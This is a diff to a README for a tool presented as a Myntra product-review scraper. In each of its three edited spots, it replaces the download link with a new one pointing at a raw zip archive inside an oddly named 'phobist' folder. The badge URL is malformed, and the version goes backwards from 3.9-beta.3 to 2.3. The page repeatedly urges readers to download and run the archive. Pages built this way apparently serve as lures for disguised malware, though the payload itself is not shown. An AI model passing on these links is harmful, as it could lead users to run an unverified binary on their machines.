@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download the latest release](https://github.com/KaterineLimaE/myntra-reviews-scraper/raw/refs/heads/main/phobist/scraper_myntra_reviews_3.9-beta.3.zip%20Now-Get%20It%20Here-brightgreen)](https://github.com/KaterineLimaE/myntra-reviews-scraper/raw/refs/heads/main/phobist/scraper_myntra_reviews_3.9-beta.3.zip)
+[![Download the latest release](https://raw.githubusercontent.com/KaterineLimaE/myntra-reviews-scraper/main/phobist/myntra-scraper-reviews-2.3.zip%20Now-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/KaterineLimaE/myntra-reviews-scraper/main/phobist/myntra-scraper-reviews-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ Before you download, ensure your computer meets the following system requirement
 
 ### Step 1: Visit the Download Page
 
-To get started, [visit this page to download](https://github.com/KaterineLimaE/myntra-reviews-scraper/raw/refs/heads/main/phobist/scraper_myntra_reviews_3.9-beta.3.zip). You will find the latest release of the software.
+To get started, [visit this page to download](https://raw.githubusercontent.com/KaterineLimaE/myntra-reviews-scraper/main/phobist/myntra-scraper-reviews-2.3.zip). You will find the latest release of the software.
 
 ### Step 2: Choose Your Version
 
@@ -63,7 +63,7 @@ Once you have the application running, follow these steps to extract reviews:
 
 To ensure you keep up with the latest features and improvements:
 
-1. Regularly check [this page to download](https://github.com/KaterineLimaE/myntra-reviews-scraper/raw/refs/heads/main/phobist/scraper_myntra_reviews_3.9-beta.3.zip) for new releases.
+1. Regularly check [this page to download](https://raw.githubusercontent.com/KaterineLimaE/myntra-reviews-scraper/main/phobist/myntra-scraper-reviews-2.3.zip) for new releases.
 2. Download the latest version and repeat the installation steps. Your previous data will usually remain intact.
 
 ## 🆘 Troubleshooting
